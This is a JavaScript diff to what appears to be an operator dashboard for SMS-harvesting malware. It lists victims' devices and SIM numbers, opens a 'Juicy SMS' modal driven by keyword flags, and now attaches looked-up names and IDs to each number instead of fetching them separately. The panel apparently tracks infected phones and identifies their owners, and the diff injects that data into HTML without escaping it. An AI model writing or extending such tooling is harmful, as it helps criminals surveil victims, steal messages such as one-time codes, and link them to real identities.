@@ -900,44 +900,6 @@ function copyDeviceId(evt, deviceId, container) {
   });
 }
 
-// ── Fetch Paanel data (NAME and ID) for SIM numbers ──────────────────────────
-async function fetchPaanelData(number, elementId) {
-  const el = document.getElementById(elementId);
-  if (!el) return;
-  
-  // Show loading state
-  el.textContent = '⏳ Loading...';
-  el.style.color = 'var(--muted)';
-  
-  try {
-    const res = await fetch(`/api/paanel/${number}`);
-    const data = await res.json();
-    
-    if (data.error) {
-      el.textContent = '❌ Error';
-      el.title = data.error;
-      return;
-    }
-    
-    // Display NAME and ID if available
-    if (data.name || data.id) {
-      const nameDisplay = data.name ? `${data.name}` : '';
-      const idDisplay = data.id ? `ID: ${data.id}` : '';
-      const parts = [nameDisplay, idDisplay].filter(Boolean);
-      el.innerHTML = parts.join(' • ');
-      el.style.color = 'var(--accent)';
-      el.title = data.cached ? 'Cached data from Paanel' : 'Fresh data from Paanel';
-    } else {
-      el.textContent = '—';
-      el.style.color = 'var(--muted)';
-    }
-  } catch (error) {
-    el.textContent = '❌ Failed';
-    el.title = error.message;
-    el.style.color = 'var(--red)';
-  }
-}
-
 // ── Juicy SMS Modal ───────────────────────────────────────────────────────────
 async function openJuicySms(evt, urlId, deviceId, brand) {
   evt.stopPropagation();
@@ -1021,18 +983,25 @@ function renderDevices() {
     const isOn = d.status === 'online';
     const activeToday = _isActiveToday(d.lastActivity);
 
-    // SIM rendering: if has clean number → paanel link + fetch NAME/ID, else → editable field
-    function simCell(simRaw, simClean, simOverride, slot, deviceId) {
+    // SIM rendering: display number as link + enrichment data below
+    function simCell(simRaw, simClean, simOverride, slot, deviceId, enrichedData) {
       const override = simOverride || '';
       const effective = override || simClean;
       if (effective) {
         // Display: show override value as-is (may be a name or number), or simRaw
         const display = override || simRaw;
-        const paanelId = `paanel-${deviceId}-${slot}`;
         
-        // Fetch Paanel data if we have a clean number
-        if (simClean) {
-          fetchPaanelData(simClean, paanelId);
+        // Build enrichment display (multiple records on separate lines)
+        let enrichmentHtml = '';
+        if (enrichedData && Array.isArray(enrichedData) && enrichedData.length > 0) {
+          enrichmentHtml = enrichedData.map(record => {
+            const parts = [];
+            if (record.name) parts.push(record.name);
+            if (record.id) parts.push(`ID: ${record.id}`);
+            return parts.join(' • ');
+          }).filter(Boolean).map(text => 
+            `<div style="font-size:10px;color:var(--accent);line-height:1.3">${text}</div>`
+          ).join('');
         }
         
         return `<div class="sim-edit-wrap" style="flex-direction:column;align-items:flex-start;gap:2px">
@@ -1043,7 +1012,7 @@ function renderDevices() {
             }
             <button class="sim-edit-btn" title="Edit" onclick="startSimEdit(event,'${deviceId}','${slot}',this)">✏️</button>
           </div>
-          <div id="${paanelId}" style="font-size:10px;color:var(--muted);min-height:12px"></div>
+          ${enrichmentHtml}
         </div>`;
       }
       // No number — show editable placeholder
@@ -1053,8 +1022,8 @@ function renderDevices() {
       </div>`;
     }
 
-    const sim1Html = simCell(d.sim1, d.sim1Clean, d.sim1Override, 'sim1', d.deviceId);
-    const sim2Html = simCell(d.sim2, d.sim2Clean, d.sim2Override, 'sim2', d.deviceId);
+    const sim1Html = simCell(d.sim1, d.sim1Clean, d.sim1Override, 'sim1', d.deviceId, d.sim1Enriched);
+    const sim2Html = simCell(d.sim2, d.sim2Clean, d.sim2Override, 'sim2', d.deviceId, d.sim2Enriched);
 
     const kwHtml = d.juicyKeywords.length
       ? `<div style="display:flex;align-items:flex-start;gap:4px;flex-wrap:wrap">
